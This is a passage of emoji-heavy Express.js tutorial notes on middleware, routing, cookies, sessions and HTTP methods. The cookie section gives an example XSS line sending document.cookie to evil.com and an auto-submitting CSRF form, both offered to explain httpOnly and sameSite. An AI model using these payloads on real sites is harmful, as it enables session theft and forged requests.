# ----Middleware order and cautions

This is a **very important Express concept** — and many bugs come from this exact thing 🔥

Let’s break it so you  **never get confused again** .

### 🔥 Middleware Definition

**A function that has access to the request and response objects, and can execute code, modify them, end the request-response cycle, or pass control to the next function in the stack.**

### 🧠 Core Idea

👉 In  **Express.js** , middleware runs:

➡️ **Top → Down (in the order you define them)**
➡️ Like a pipeline / chain

**🔄 Mental Model**

```text
Request →
  middleware 1 →
  middleware 2 →
  route handler →
  response
```

👉 Order = EVERYTHING ⚠️

### 🔥 Why Position Matters

Because:

👉 Middleware executes **sequentially**
👉 If something runs before/after, behavior changes completely

### ⚡ Example 1: Body Parser Position

**❌ Wrong**

```js
app.get('/user', (req, res) => {
  console.log(req.body); // undefined ❌
});

app.use(express.json());
```

**✅ Correct**

```js
app.use(express.json());

app.get('/user', (req, res) => {
  console.log(req.body); // works ✅
});
```

**🧠 Why?**

👉 `express.json()` parses body
👉 If placed after → route never gets parsed data

### ⚡ Example 2: Auth Middleware

**❌ Wrong**

```js
app.get('/dashboard', (req, res) => {
  res.send('Dashboard');
});

app.use(authMiddleware);
```

👉 Auth never runs ❌

**✅ Correct**

```js
app.use(authMiddleware);

app.get('/dashboard', (req, res) => {
  res.send('Dashboard');
});
```

**🧠 Why?**

👉 Request hits route BEFORE middleware

### ⚡ Example 3: Logging

**❌ Wrong**

```js
app.get('/test', handler);

app.use(logger);
```

👉 Logger never logs `/test`

**✅ Correct**

```js
app.use(logger);

app.get('/test', handler);
```

### ⚠️ Very Important Rule

👉 Once a response is sent:

```js
res.send()
```

👉 ❌ No further middleware runs

🔥 Example

```js
app.use((req, res, next) => {
  res.send('Done');
  next(); // useless ❌
});
```

👉 Request ends here

### ⚡ Example 4: Error Middleware Position

**❌ Wrong**

```js
app.use(errorHandler); // placed early ❌

app.get('/', (req, res) => {
  throw new Error('Oops');
});
```

**✅ Correct**

```js
app.get('/', (req, res) => {
  throw new Error('Oops');
});

app.use(errorHandler); // last ✅
```

**🧠 Why?**

👉 Error middleware catches errors **after they occur**

### 🔑 Types of Middleware & Position

**1. Global Middleware**

```js
app.use(express.json());
```

👉 Should be at top

**2. Route Middleware**

```js
app.get('/admin', auth, handler);
```

👉 Runs only for that route

**3. Error Middleware**

```js
app.use((err, req, res, next) => {})
```

👉 Always LAST

### 🔥 Order Breakdown (Best Practice)

```js
app.use(logger);           // 1. logging
app.use(express.json());   // 2. parsing
app.use(cors());           // 3. cors

app.use(auth);             // 4. auth (optional)

app.use('/api', routes);   // 5. routes

app.use(errorHandler);     // 6. error handler
```

### ⚠️ Common Mistakes

**❌ 1. Forgetting `next()`**

```js
app.use((req, res, next) => {
  console.log('Hi');
});
```

👉 Request hangs 😬

**❌ 2. Sending response twice**

```js
res.send('A');
res.send('B'); // error ❌
```

**❌ 3. Misplacing middleware**

👉 Leads to:

* undefined body
* auth bypass
* logs missing

---

# ----Middleware- `return vs next()`

This is one of the **most misunderstood Express concepts** 🔥 — and very important.

Let’s make it crystal clear 👇

### 🧠 Core Idea

In **Express.js** middleware:

👉 `next()` → **passes control to next middleware**
👉 `return` → **just stops your current function execution**

### ⚡ Key Difference (Simple)

| Thing      | What it does              |
| ---------- | ------------------------- |
| `next()` | Moves request forward 🚀  |
| `return` | Stops current function 🛑 |

### 🔥 1. `next()` — Continue the pipeline

✅ Example

```js
app.use((req, res, next) => {
  console.log('Middleware 1');
  next();
});

app.use((req, res) => {
  console.log('Middleware 2');
  res.send('Done');
});
```

🧠 Flow

```text
Middleware 1 → next() → Middleware 2
```

**❌ Without `next()`**

```js
app.use((req, res, next) => {
  console.log('Middleware 1');
});
```

👉 Request gets stuck 😬
👉 No response sent

### 🔥 2. `return` — Stop execution (inside current middleware)

**❌ Example (bug)**

```js
app.use((req, res, next) => {
  if (!req.user) {
    res.send('Unauthorized');
  }
  next(); // ❌ still runs!
});
```

**🚨 Problem**

👉 Even after sending response:

* `next()` runs
* Next middleware executes
* Can cause errors like:
  ❌ “Cannot set headers after they are sent”

**✅ Correct**

```js
app.use((req, res, next) => {
  if (!req.user) {
    return res.send('Unauthorized'); // ✅ stops here
  }
  next();
});
```

### 🧠 Why `return` is needed?

👉 Because:

```js
res.send()
```

❌ DOES NOT stop function execution automatically

### 🔥 3. Combining `return + next()`

✅ Clean pattern

```js
app.use((req, res, next) => {
  if (!req.user) {
    return res.status(401).send('Unauthorized');
  }

  next();
});
```

### 🔥 4. `next(err)` (Bonus)

👉 For error handling

```js
next(new Error('Something broke'));
```

👉 Skips normal middleware
👉 Goes to error middleware

---

# ----Middlewares- Some Build-in Middlewares

👉 In  **Express.js** , there are **very few built-in middlewares** (compared to what people usually think).

👉 Things like `cors`, `morgan`, etc. are **NOT built-in** — they are third-party.

**🧠 Built-in Middlewares in Express**

These come **out of the box** with Express 👇

### 🔹 1. `express.json()`

👉 Parses incoming **JSON request body**

```js
app.use(express.json());
```

**🧠 Example**

```js
app.post('/user', (req, res) => {
  console.log(req.body); // parsed JSON
});
```

**❗ Without it**

```js
req.body === undefined ❌
```

### 🔹 2. `express.urlencoded()`

👉 Parses **form data (URL-encoded)**

```js
app.use(express.urlencoded({ extended: true }));
```

**🧠 Example**

```html
<form method="POST">
  <input name="username" />
</form>
```

👉 Backend:

```js
req.body.username
```

### 🔹 3. `express.static()`

👉 Serves **static files**

```js
app.use(express.static('public'));
```

**🧠 Example**

```text
public/
  index.html
  style.css
```

👉 Accessible at:

```
http://localhost:3000/index.html
```

### 🔹 4. `express.text()`

👉 Parses **plain text body**

```js
app.use(express.text());
```

**🧠 Example**

```js
req.body = "Hello world"
```

### 🔹 5. `express.raw()`

👉 Parses **raw binary data**

```js
app.use(express.raw());
```

**🧠 Use case**

* Webhooks (Stripe, etc.)
* Binary payloads

### 🔥 Summary Table

| Middleware               | Purpose            |
| ------------------------ | ------------------ |
| `express.json()`       | Parse JSON         |
| `express.urlencoded()` | Parse form data    |
| `express.static()`     | Serve static files |
| `express.text()`       | Parse text         |
| `express.raw()`        | Parse raw binary   |

### ⚠️ Common Confusion

**❌ Not built-in**

These are external packages:

* `cors`
* `morgan`
* `helmet`
* `cookie-parser`

👉 Must install:

```bash
npm install cors
```

### 🧠 Important Note

👉 Older versions of Express used:

```js
body-parser
```

👉 Now replaced by:

✔️ `express.json()`
✔️ `express.urlencoded()`

---

# ----Middleware is Express.js's Biggest advantage

👉 The *biggest advantage* of **Express.js** is not just routing — it’s the  **middleware pipeline system** .

Let’s build that ourselves using plain  **Node.js** .

### 🧠 Core Idea

👉 Middleware is just:

✔️ Functions
✔️ Executed in sequence
✔️ Each gets `(req, res, next)`

### 🚀 Step 1: Basic HTTP Server

```js
const http = require('node:http');

const server = http.createServer((req, res) => {
  res.end('Hello');
});

server.listen(3000);
```

👉 No middleware here ❌

### 🔥 Step 2: Create Middleware System

**🧩 Store middleware**

```js
const middlewares = [];
```

**➕ Function to add middleware**

```js
function use(fn) {
  middlewares.push(fn);
}
```

**🔄 Execute middleware chain**

```js
function runMiddlewares(req, res) {
  let i = 0;

  function next() {
    const fn = middlewares[i++];
    if (fn) {
      fn(req, res, next);
    }
  }

  next();
}
```

**🌐 Use it in server**

```js
const http = require('node:http');

const middlewares = [];

function use(fn) {
  middlewares.push(fn);
}

function runMiddlewares(req, res) {
  let i = 0;

  function next() {
    const fn = middlewares[i++];
    if (fn) {
      fn(req, res, next);
    }
  }

  next();
}

use((req, res, next) => {
  console.log('Middleware 1');
  next();
});

use((req, res, next) => {
  console.log('Middleware 2');
  next();
});

use((req, res) => {
  res.end('Done');
});

const server = http.createServer((req, res) => {
  runMiddlewares(req, res);
});

server.listen(3000);
```

🧠 Flow

```text
Request →
  Middleware 1 →
  Middleware 2 →
  Final handler →
Response
```

👉 This is basically Express 😄

### 🔥 Step 3: Add Route Handling

**Simple routing middleware**

```js
use((req, res, next) => {
  if (req.url === '/home') {
    res.end('Home Page');
  } else {
    next();
  }
});
```

**404 handler**

```js
use((req, res) => {
  res.statusCode = 404;
  res.end('Not Found');
});
```

### 🔥 Step 4: Example (Realistic)

```js
use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next();
});

use((req, res, next) => {
  if (req.url === '/admin') {
    res.end('Unauthorized');
  } else {
    next();
  }
});

use((req, res) => {
  res.end('Welcome');
});
```

### ⚠️ Problems in Our Implementation

**❌ 1. No error handling**

👉 Express has:

```js
(err, req, res, next)
```

**❌ 2. No async handling**

👉 `next()` becomes tricky with promises

**❌ 3. No routing system**

👉 We manually check `req.url`

**❌ 4. No body parsing**

👉 You must manually read streams

### 🔥 Step 5: Add Error Middleware (Advanced)

```js
function runMiddlewares(req, res) {
  let i = 0;

  function next(err) {
    const fn = middlewares[i++];

    if (!fn) return;

    if (err) {
      if (fn.length === 4) {
        fn(err, req, res, next);
      } else {
        next(err);
      }
    } else {
      if (fn.length < 4) {
        fn(req, res, next);
      } else {
        next();
      }
    }
  }

  next();
}
```

**🧠 Now supports:**

✔️ Normal middleware
✔️ Error middleware

### 🎯 What Express Actually Gives You

**Instead of writing all this:**

✔️ Middleware chaining
✔️ Routing system
✔️ Error handling
✔️ Body parsing
✔️ Utilities

---

# ----Routing is Express.js's Another Biggest advantage

You *can* do routing in plain  **Node.js** , but it quickly becomes messy.

Let’s see **why it’s difficult** 👇

### 🧠 1. Basic Routing in Node.js (Manual)

Example

```js
const http = require('node:http');

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    res.end('Home');
  } 
  else if (req.method === 'GET' && req.url === '/about') {
    res.end('About');
  } 
  else if (req.method === 'POST' && req.url === '/user') {
    res.end('User Created');
  } 
  else {
    res.statusCode = 404;
    res.end('Not Found');
  }
});

server.listen(3000);
```

**🧠 Problem already?**

👉 Looks fine for 3 routes…
👉 But imagine 50+ routes 😬

### 🔥 2. Problems Without Express

##### **❌ 1. URL Matching is Manual**

**Dynamic routes?**

```js
/users/123
/users/456
```

👉 You must parse manually:

```js
if (req.url.startsWith('/users/')) {
  const id = req.url.split('/')[2];
}
```

👉 Error-prone ❌
👉 Ugly ❌

**✅ In Express**

```js
app.get('/users/:id', (req, res) => {
  console.log(req.params.id);
});
```

##### **❌ 2. Query Params Parsing**

**Node.js**

```js
const url = require('node:url');
const parsed = url.parse(req.url, true);

console.log(parsed.query);
```

**Express**

```js
req.query
```

👉 Done 😄

##### ❌ 3. Method Handling Becomes Messy

```js
if (req.method === 'GET' && req.url === '/user') {}
else if (req.method === 'POST' && req.url === '/user') {}
```

👉 Repetition everywhere ❌

**Express**

```js
app.get('/user', handler);
app.post('/user', handler);
```

##### ❌ 4. No Route Separation

👉 Everything in one file:

```js
if (...) {}
else if (...) {}
else if (...) {}
```

👉 Hard to maintain 😬

**Express**

```js
app.use('/user', userRoutes);
```

👉 Modular ✅

##### ❌ 5. Middleware Integration is Hard

**👉 In Node:**

You must manually decide:

```js
if (req.url === '/admin') {
  auth(req, res, () => handler(req, res));
}
```

👉 Becomes messy quickly ❌

**Express**

```js
app.get('/admin', auth, handler);
```

👉 Clean pipeline ✅

##### ❌ 6. No Pattern Matching

👉 Want:

```text
/api/v1/users
/api/v2/users
```

👉 You must handle manually

**Express**

```js
app.use('/api/v1', v1Routes);
```

##### ❌ 7. No 404 / Fallback Handling System

👉 You must manually ensure:

```js
else {
  res.statusCode = 404;
}
```

**Express**

```js
app.use((req, res) => {
  res.status(404).send('Not Found');
});
```

##### ❌ 8. No Parameter Validation / Extraction

👉 You manually extract:

```js
const id = req.url.split('/')[2];
```

👉 No validation, no structure ❌

### ⚡ Real Problem at Scale

Imagine 100 routes:

👉 Plain Node:

```text
Huge if-else jungle 🌴😬
```

**Express:**

```text
Clean modular routes 📁✨
```

### 🔥 Why Express Routing is Powerful

**Express internally:**

✔️ Maintains route stack
✔️ Matches path patterns
✔️ Extracts params
✔️ Chains middleware
✔️ Separates concerns

### 🧠 Final Comparison

| Feature        | Node.js (raw) | Express     |
| -------------- | ------------- | ----------- |
| Routing        | Manual ❌     | Built-in ✅ |
| Dynamic routes | Hard ❌       | Easy ✅     |
| Query parsing  | Manual ❌     | Auto ✅     |
| Middleware     | Manual ❌     | Built-in ✅ |
| Structure      | Messy ❌      | Clean ✅    |

---

# ----Cookie options- `httpOnly, sameSite & secure`

🧠 Context

In  **Express.js** :

```js
res.cookie('token', value, options);
```

👉 `options` control **how the browser handles the cookie**

### 🔐 1. `httpOnly`

📌 What it does

```js
httpOnly: true
```

👉 Cookie **cannot be accessed via JavaScript**

**❌ Without httpOnly**

```js
document.cookie
```

👉 JS can read cookies ❌

**✅ With httpOnly**

```js
document.cookie
```

👉 Cookie is **hidden from JS** ✅

**🔥 Benefit**

👉 Protects against **Cross-Site Scripting (XSS)**

**🧠 Example Attack**

```js
// attacker injects script
fetch('http://evil.com?cookie=' + document.cookie);
```

👉 Steals cookies 😬

✅ With httpOnly

👉 Cookie not accessible → attack fails

### 🔐 2. `sameSite`

**📌 What it does**

👉 Controls **cross-site cookie sending**

**🧠 First: What problem is `sameSite` solving?**

👉 It protects against **Cross-Site Request Forgery (CSRF)**

##### 🧠 What is CSRF (simple)

👉 Imagine:

* You are logged into: `bank.com` 💰
* Your browser has a cookie:

```text
session=abc123
```

**😈 Attack**

You visit a malicious site: `evil.com`

That site secretly sends:

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
</form>

<script>document.forms[0].submit()</script>
```

**🚨 What happens WITHOUT sameSite?**

👉 Your browser automatically sends:

```text
session=abc123
```

👉 Bank thinks:
✔️ “This is the real user”

👉 Money transferred 😬

**🔥 So what’s the problem?**

👉 Browser **automatically sends cookies even from other websites**

##### 🚀 `sameSite` SOLUTION

👉 It controls:

> “Should cookies be sent when request comes from another site?”

##### 🧠 Values

###### 🔹 1. `sameSite: 'strict'`

📌 Rule

👉 ONLY send cookie if request comes from SAME site

🧠 Example

| Scenario                      | Cookie Sent? |
| ----------------------------- | ------------ |
| You click inside `bank.com` | ✅ YES       |
| Request from `evil.com`     | ❌ NO        |

🔥 Result

👉 CSRF attack BLOCKED 💪

###### 🔹 2. `sameSite: 'lax'` (default)

📌 Rule

👉 Allow  **safe navigation** , block dangerous ones

🧠 Example

| Scenario                  | Cookie Sent? |
| ------------------------- | ------------ |
| Clicking a link (`GET`) | ✅ YES       |
| Form POST from other site | ❌ NO        |

**🧠 Why?**

👉 GET = considered safe
👉 POST = dangerous (money transfer etc.)

🔥 Result

👉 Most CSRF attacks blocked
👉 But normal browsing works

###### 🔹 3. `sameSite: 'none'`

📌 Rule

👉 Always send cookies

**⚠️ Must use:**

```js
secure: true
```

🧠 Example

| Scenario   | Cookie Sent? |
| ---------- | ------------ |
| Same site  | ✅           |
| Other site | ✅           |

**❗ Risk**

👉 Vulnerable to CSRF ❌

> #### 👉 Why `sameSite: 'none'` used?
>
> This is where most people think *“why would we ever allow that?”* 😄
>
> But there are **real, important use cases** for `sameSite: 'none'`.
>
> 🧠 First: What does `sameSite: 'none'` do?
>
> ```js
> sameSite: 'none'
> ```
>
> 👉 Cookie is sent in  **ALL requests** , including cross-site ones
>
> ⚠️ Must use with:
>
> ```js
> secure: true
> ```
>
> #### 🔥 Question
>
>> Why allow cookies to be sent from one site to another?
>>
>
> 👉 Because **some real-world features REQUIRE cross-site communication**
>
> #### 🚀 Real Use Cases (VERY IMPORTANT)
>
> ##### 🔹 1. Third-Party Authentication (OAuth)
>
> **Example**
>
> 👉 Login with:
>
> * Google
> * GitHub
>
> Flow
>
> ```text
> yourapp.com → accounts.google.com → back to yourapp.com
> ```
>
> 👉 During this:
>
> ✔️ Cookies must travel across domains
> ✔️ Otherwise login breaks
>
> Without `sameSite: 'none'`
>
> ❌ Auth fails
> ❌ Session not maintained
>
> ##### 🔹 2. Embedded Content (iframes)
>
> Example
>
> 👉 You embed:
>
> ```html
> <iframe src="https://payment.com"></iframe>
> ```
>
> 👉 That site needs its cookies:
>
> ✔️ To know user session
> ✔️ To process payments
>
> Without `sameSite: 'none'`
>
> ❌ Cookie not sent
> ❌ Payment/login fails
>
> ##### 🔹 3. Third-Party APIs / Services
>
> Example
>
> 👉 Stripe / Razorpay / PayPal
>
> 👉 Your site → their domain
>
> 👉 They need cookies for:
>
> * authentication
> * tracking session
>
> ⚠️ Why NOT always use `none`?
>
> 👉 Because:
>
> ❌ Opens door for **Cross-Site Request Forgery (CSRF)**
> ❌ Less secure

##### 🎯 Why do we NEED it?

👉 Because:

✔️ Browsers auto-send cookies
✔️ Attackers exploit that
✔️ sameSite restricts this behavior

### 🔐 3. `secure`

**📌 What it does**

```js
secure: true
```

👉 Cookie sent ONLY over HTTPS

**❌ Without secure**

👉 Sent over HTTP → can be intercepted

**✅ With secure**

👉 Only HTTPS → encrypted transmission 🔒

### 🧠 So:

👉 `secure` ≠ protection from JS
👉 `httpOnly` ≠ protection from network

### 🔐 Best Practice (IMPORTANT)

```js
res.cookie('token', value, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

### 🎯 Real-World Use

JWT in cookie

👉 Always use:

* `httpOnly: true` ✅
* `secure: true` ✅
* `sameSite: 'strict'` or `'lax'` ✅

---

# -----Express-session in detail

### 🧠 What is `express-session`?

👉 **express-session** is middleware that:

> **Stores user data on the server and tracks users using a session ID stored in a cookie**

### 🔥 Core Idea (Super Simple)

👉 Instead of storing data in the browser:

* Server stores data 🧠
* Browser stores only an ID 🪪

### 🔄 How it works (Flow)

**🧾 Step 1: User visits**

```text
Client → Server
```

**🔐 Step 2: Server creates session**

```js
req.session = {}
```

👉 Stored in server memory / DB

**🍪 Step 3: Server sends cookie**

```text
Set-Cookie: connect.sid=abc123
```

👉 This is the **session ID**

**📡 Step 4: Client sends cookie back**

```text
Cookie: connect.sid=abc123
```

**🧠 Step 5: Server retrieves session**

👉 Using that ID → finds stored data

### 🎯 Example

**Setup**

```js
const session = require('express-session');

app.use(session({
  secret: 'mysecret',
  resave: false,
  saveUninitialized: true
}));
```

**Usage**

```js
app.get('/login', (req, res) => {
  req.session.user = 'Arjun';
  res.send('Logged in');
});

app.get('/profile', (req, res) => {
  res.send(req.session.user);
});
```

🧠 What happens?

👉 `/login`:

* session created
* user stored

👉 `/profile`:

* session retrieved
* user available

### 🔥 Why do we need it?

**❌ Without sessions**

👉 HTTP is **stateless**

```text
Request 1 → no memory
Request 2 → no memory
```

**✅ With sessions**

👉 Server remembers user

```text
User logs in → stored
Next request → recognized
```

### ⚡ Real Use Cases

✔️ Login systems
✔️ Shopping carts
✔️ User preferences
✔️ Authentication

### ⚙️ Important Options

##### 🔹 1. `secret`

```js
secret: 'mysecret'
```

👉 Used to sign session ID cookie

✔️ Prevents tampering

##### 🔹 2. `resave`

```js
resave: false
```

👉 Save session even if unchanged?

* `true` → always save ❌ (wasteful)
* `false` → save only if modified ✅

##### 🔹 3. `saveUninitialized`

```js
saveUninitialized: true
```

👉 Save empty sessions?

* `true` → creates session even if unused
* `false` → only when data added ✅

### 🔹 4. `cookie` options

Example

```js
cookie: {
  maxAge: 1000 * 60 * 60,
  httpOnly: true,
  secure: true,
  sameSite: 'lax'
}
```

### ⚔️ Is it always used with cookies?

**👉 YES (almost always)**

👉 Because:

* Browser needs to send session ID
* Cookies are automatic

**❓ Can we avoid cookies?**

👉 Technically yes:

* Send session ID manually (headers, URL)

👉 But:

❌ Not practical
❌ Not secure

### 🔥 Session vs JWT (Quick Insight)

| Feature | Session     | JWT         |
| ------- | ----------- | ----------- |
| Storage | Server      | Client      |
| State   | Stateful    | Stateless   |
| Scaling | Harder      | Easier      |
| Control | Easy logout | Hard logout |

### ⚠️ Common Mistakes

**❌ Not setting secure cookies**

**❌ Using `saveUninitialized: true`**

👉 Creates useless sessions

### 🎯 Best Practice Setup

```js
app.use(session({
  secret: 'supersecret',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 1000 * 60 * 60
  }
}));
```

### 👉` cookie-parser` not needed when using express-session

**You usually do NOT need `cookie-parser` when using express-session.**

But let’s understand **why** (this is what interviewers care about 🔥).

**🧠 Why `cookie-parser` is NOT needed**

👉 `express-session` **already handles cookies internally**

When you do:

```js
const session = require('express-session');

app.use(session({...}));
```

👉 It:

* **Reads cookies** from request headers
* **Parses the session cookie** (`connect.sid`)
* **Sets cookies** in response

---

# ----Http methods- `post() vs put() vs patch()`

### 🧠 First: What are POST and PUT?

In  **Express.js** :

```js
app.post('/users', handler);
app.put('/users/:id', handler);
app.patch('/user/:id', handler);
```

```

```

👉 All send data to server
👉 But **their purpose is different**

### 🔥 Core Difference

| Method | Purpose                   |
| ------ | ------------------------- |
| POST   | Create new resource       |
| PUT    | Replace existing resource |
| PATCH  | Update part of resource   |

### 🧠 1. POST — Create

**📌 Idea**

👉 “Create something NEW”

🧾 Example

```http
POST /users
```

```json
{
  "name": "Arjun"
}
```

🧠 What server does

👉 Creates new user:

```json
{
  "id": 1,
  "name": "Arjun"
}
```

**🔁 Important**

👉 Server decides:

* ID
* Location

**❗ Calling POST again**

```text
POST → POST → POST
```

👉 Creates **multiple users** ❌ (not idempotent)

### 🔥 2. PUT — Replace

**📌 Idea**

👉 “Replace this specific resource”

🧾 Example

```http
PUT /users/1
```

```json
{
  "name": "Arjun S"
}
```

🧠 What server does

👉 Replaces user `id=1`

**🔁 Calling PUT again**

```text
PUT → PUT → PUT
```

👉 Same result ✅ (idempotent)

### 🔥 3. `.patch()` — Partial Update

**📌 Idea**

👉 Send only fields to update

🧾 Example

Existing user:

```json
{
  "name": "Arjun",
  "age": 22
}
```

Request

```http
PATCH /user/1
```

```json
{
  "name": "Arjun S"
}
```

✅ Result

```json
{
  "name": "Arjun S",
  "age": 22
}
```

**🧠 Why?**

👉 PATCH = “Update only what I send”

**❗ Calling PATCH again**

🧠 PATCH may NOT be idempotent

👉 Depends on operation

```text
PATCH (increment) → different result each time
```

### ⚠️ Common Mistakes

**❌ Using POST for update**

```http
POST /users/1
```

👉 Not RESTful ❌

**❌ Using PUT for create (confusing case)**

```http
PUT /users/1
```

👉 Sometimes used to create if not exists
👉 But not common in modern APIs

### 🧠 PUT vs PATCH vs POST

| Method | Use            |
| ------ | -------------- |
| POST   | Create         |
| PUT    | Replace        |
| PATCH  | Partial update |

Great — this is a **classic interview question** 🔥
Let’s make it crystal clear and practical.

---

# ----Http Method- HEAD

### 🧠 What is the `HEAD` method?

> **`HEAD` is just like `GET`, but the server sends only headers — no response body.**

🧾 Example

```http
HEAD /users
```

🧠 Response

```http
200 OK
Content-Type: application/json
Content-Length: 1200
```

👉 ❌ No body returned
👉 Only metadata

### 🔥 Why use `HEAD`?

**✅ 1. Check if resource exists**

```http
HEAD /file.pdf
```

👉 If:

```http
200 OK → exists
404 → not found
```

**✅ 2. Get metadata without downloading**

👉 Example:

* File size
* Last modified
* Content type

**✅ 3. Performance optimization**

👉 Avoid downloading large responses

### ⚔️ HEAD vs GET

| Feature         | GET        | HEAD       |
| --------------- | ---------- | ---------- |
| Returns body    | ✅         | ❌         |
| Returns headers | ✅         | ✅         |
| Use case        | Fetch data | Check info |

### ❓ “Does every GET have an attached HEAD request?”

👉 ❌ **No — NOT automatically**

**🔥 What actually happens**

👉 `HEAD` is a **separate HTTP method**

```text
GET  /users
HEAD /users
```

👉 These are two different requests

**⚠️ But here’s the important part**

🧠 In **Express.js**

👉 If you define:

```js
app.get('/users', handler);
```

👉 Express **automatically handles HEAD** for the same route

**How?**

👉 It runs the same handler but:

✔️ Sends only headers
❌ Strips the body

✅ Example

```js
app.get('/users', (req, res) => {
  res.send('Hello World');
});
```

**Request:**

```http
HEAD /users
```

**Response:**

```http
200 OK
Content-Length: 11
```

👉 No `"Hello World"` in body

### 🔁 Important Clarification

**❌ HEAD is NOT:**

👉 “attached” to GET
👉 “automatically sent with GET”

✅ Instead:

👉 Express provides a **fallback behavior**

### 🧠 Real-World Example

**Checking file size before download**

```http
HEAD /video.mp4
```

👉 Response:

```http
Content-Length: 500MB
```

👉 Decide whether to download

---

# ----Idempotent Http methods

This is a **core HTTP concept** and often asked in interviews 🔥

### 🧠 What does *idempotent* mean?

> **An HTTP method is idempotent if making the same request multiple times results in the same state on the server.**

👉 “Do it once or 10 times → same result”

### 🔥 Idempotent HTTP Methods

##### ✅ 1. GET

```http
GET /users
```

👉 Just fetches data
👉 No change in server state

✔️ Idempotent

##### ✅ 2. PUT

```http
PUT /users/1
```

👉 Replaces resource

```text
PUT → PUT → PUT
```

👉 Same final state

✔️ Idempotent

##### ✅ 3. DELETE

```http
DELETE /users/1
```

👉 First call → deletes
👉 Next calls → nothing to delete

👉 Still same final state (resource absent)

✔️ Idempotent

##### ✅ 4. HEAD

```http
HEAD /users
```

👉 Like GET but no body

✔️ Idempotent

##### ✅ 5. OPTIONS

```http
OPTIONS /users
```

👉 Just tells allowed methods

✔️ Idempotent

### ❌ Non-Idempotent Methods

##### ❌ POST

```http
POST /users
```

👉 Creates new resource every time

```text
POST → POST → POST
```

👉 Multiple users created ❌

##### ❌ PATCH (generally)

```http
PATCH /users/1
```

👉 Depends on logic

Example:

```json
{ "count": +1 }
```

👉 Each call changes state

❌ Not idempotent (usually)

### ⚠️ Important Note (Interview Trap)

👉 PATCH  **can be idempotent** , but:

✔️ Only if implemented carefully

Example:

```json
{ "name": "Arjun" }
```

👉 Repeating → same result

### 🧠 Final Table

| Method  | Idempotent?  |
| ------- | ------------ |
| GET     | ✅           |
| PUT     | ✅           |
| DELETE  | ✅           |
| HEAD    | ✅           |
| OPTIONS | ✅           |
| POST    | ❌           |
| PATCH   | ❌ (usually) |

---

# ----API methods- `.route() and .param()`

These two are **small APIs but very powerful in Express** 🔥

Let’s break both clearly.

### 🧠 1. `.route()`

**📌 What is it?**

In  **Express.js** :

> `.route()` lets you define **multiple HTTP methods for the same path in a clean, chained way**

**❌ Without `.route()`**

```js
app.get('/user', (req, res) => {
  res.send('GET user');
});

app.post('/user', (req, res) => {
  res.send('POST user');
});

app.put('/user', (req, res) => {
  res.send('PUT user');
});
```

👉 Repeating `/user` again and again ❌

**✅ With `.route()`**

```js
app.route('/user')
  .get((req, res) => {
    res.send('GET user');
  })
  .post((req, res) => {
    res.send('POST user');
  })
  .put((req, res) => {
    res.send('PUT user');
  });
```

**🧠 Why use it?**

✔️ Cleaner code
✔️ Group related routes
✔️ Avoid repetition

### 🧠 2. `.param()`

**📌 What is it?**

> `.param()` is used to **run middleware whenever a specific route parameter is present**

🔥 Example Route

```js
app.get('/user/:id', (req, res) => {
  res.send(`User ${req.params.id}`);
});
```

**Now using `.param()`**

```js
app.param('id', (req, res, next, value) => {
  console.log('Param middleware:', value);

  // Example: validate or fetch user
  req.user = { id: value };

  next();
});
```

🧠 What happens?

Request:

```text
/user/123
```

**Flow**

```text
.param('id') runs first →
then route handler runs
```

**🧠 Output**

```text
Param middleware: 123
User 123
```

##### 🔥 Why use `.param()`?

**✅ 1. Validation**

```js
if (!isValidId(value)) {
  return res.status(400).send('Invalid ID');
}
```

**✅ 2. Fetch data once**

```js
req.user = await User.findById(value);
```

👉 Reuse in multiple routes

**✅ 3. Avoid repetition**

Instead of:

```js
app.get('/user/:id', validate, handler);
app.put('/user/:id', validate, handler);
```

👉 Use `.param()` once

##### 🔁 Flow Visualization

```text
Request → param middleware → route handler → response
```

##### ⚠️ Important Notes

**🔹 Runs ONLY when param exists**

```text
/user/123 → runs ✅
/user → does NOT run ❌
```

**🔹 Runs once per param**

Even if multiple routes match

**🔹 Order matters**

👉 `.param()` should be defined before routes

---

# ----Regex in routes

This is a powerful (and often underused) feature in **Express.js** 🔥

You can use **regular expressions** in routes to control matching very precisely.

### 🧠 1. Where can we use regex?

👉 In Express routes like:

```js
app.get(...)
app.post(...)
app.use(...)
```

### 🔥 2. Method 1: Regex as the entire route

✅ Example

```js
app.get(/^\/user\/\d+$/, (req, res) => {
  res.send('User with numeric ID');
});
```

🧠 What it matches

```text
/user/123   ✅
/user/abc   ❌
```

💡 Explanation

```text
^         → start
\/user\/  → literal path
\d+       → one or more digits
$         → end
```

### 🔥 3. Method 2: Regex inside route params

✅ Example

```js
app.get('/user/:id(\\d+)', (req, res) => {
  res.send(`User ID: ${req.params.id}`);
});
```

🧠 Matches

```text
/user/123   ✅
/user/abc   ❌
```

**⚠️ Important**

👉 Need double `\\` because:

* JS string escaping

### 🔥 4. Multiple conditions

✅ Example

```js
app.get('/product/:id(\\d+)-:name([a-zA-Z]+)', (req, res) => {
  res.send(req.params);
});
```

🧠 Matches

```text
/product/123-phone   ✅
/product/123-123     ❌
```

### 🔥 5. Optional matching with regex

✅ Example

```js
app.get(/^\/user\/(\d+)?$/, (req, res) => {
  res.send('Optional ID');
});
```

🧠 Matches

```text
/user/       ✅
/user/123    ✅
```

### 🔥 6. Match multiple routes

✅ Example

```js
app.get(/^\/(login|signup)$/, (req, res) => {
  res.send('Auth page');
});
```

🧠 Matches

```text
/login   ✅
/signup  ✅
```

### ⚠️ Common Mistakes

**❌ Forgetting escape**

```js
'/user/:id(\d+)' ❌
```

👉 Wrong

✅ Correct

```js
'/user/:id(\\d+)' ✅
```

### 🎯 When should you use regex?

**✅ Use when:**

* Validate params (ID must be number)
* Restrict routes
* Complex matching

**❌ Avoid when:**

* Simple routes → keep readable

---

# ----Middleware- `express.static()`

👉 **`express.static()` does NOT “render” HTML**

👉 It simply **serves files as-is**

### 🧠 What `express.static()` actually does

In  **Express.js** :

```js
app.use(express.static('public'));
```

👉 Means:

> “If a file exists in `public/`, send it directly to the browser”

**📁 Example Setup**

```
project/
  public/
    index.html
    about.html
    style.css
  app.js
```

**🚀 Code**

```js
const express = require('express');
const app = express();

app.use(express.static('public'));

app.listen(3000);
```

### 🌐 How it works

**👉 Access in browser**

```text
